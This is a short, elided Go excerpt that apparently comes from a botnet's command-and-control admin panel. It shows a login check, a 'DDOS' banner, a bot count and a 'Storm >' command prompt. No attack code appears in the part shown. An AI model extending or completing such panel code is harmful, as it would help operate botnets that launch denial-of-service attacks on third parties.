...
func (this *Admin) Handle() {
    ...
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[32;1mfuck\r\n"))
        this.conn.Write([]byte("\033[31m(any key)\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
    this.conn.Write([]byte("\r\n\033[0m"))
    this.conn.Write([]byte("\033[90m[+] DDOS \033[97m| \033[96mheck\r\n"))
    ...
    for {
        ...
        var botCount int
        this.conn.Write([]byte("\033[0;96mStorm\033[01;37m > \033[0m"))
